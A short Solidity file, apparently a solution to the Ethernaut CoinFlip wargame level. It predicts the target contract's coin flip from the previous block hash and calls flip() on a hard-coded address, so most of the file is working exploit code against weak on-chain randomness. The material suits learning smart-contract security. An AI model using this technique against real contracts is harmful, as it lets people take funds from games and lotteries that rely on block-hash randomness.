pragma solidity ^0.4.18;


// Ok so this is for the ABI or else solidity doesn't know what a CoinFlip is 
contract CoinFlip{
    function flip(bool _guess) public returns (bool);
}


contract sinasEvilCoinFlip {
    // Ok so basically this is how you call other contracts that are deployed
    // Contract - visibility - name     = contract (contract address)
    CoinFlip ethernaut_coin_flip;
    // name.function() for that contract 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function haxor() public{
    // Oh yeah, we're hard coding
        ethernaut_coin_flip = CoinFlip(0xe52b49f31e106243026817f802bb9bbba49a70e7);

        //putting it in a for loop takes too much gas
        //for (uint i = 0; i < 10; i++) {
            uint256 blockValue = uint256(block.blockhash(block.number-1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            ethernaut_coin_flip.flip(side);
        //}
    }
}